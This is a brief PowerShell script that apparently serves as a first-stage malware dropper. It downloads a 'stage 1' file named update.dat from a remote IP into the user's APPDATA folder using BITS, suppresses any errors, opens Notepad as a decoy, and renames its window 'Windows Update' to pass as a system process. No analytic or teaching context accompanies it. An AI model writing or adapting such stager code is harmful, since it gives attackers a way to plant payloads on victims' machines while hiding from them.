
$Stage1Url = 'https://192.0.2.4/update.dat'
$DropPath = "$env:APPDATA\update.dat"
Start-BitsTransfer -Source $Stage1Url -Destination $DropPath -ErrorAction SilentlyContinue
& 'notepad.exe'
$Host.UI.RawUI.WindowTitle = "Windows Update"
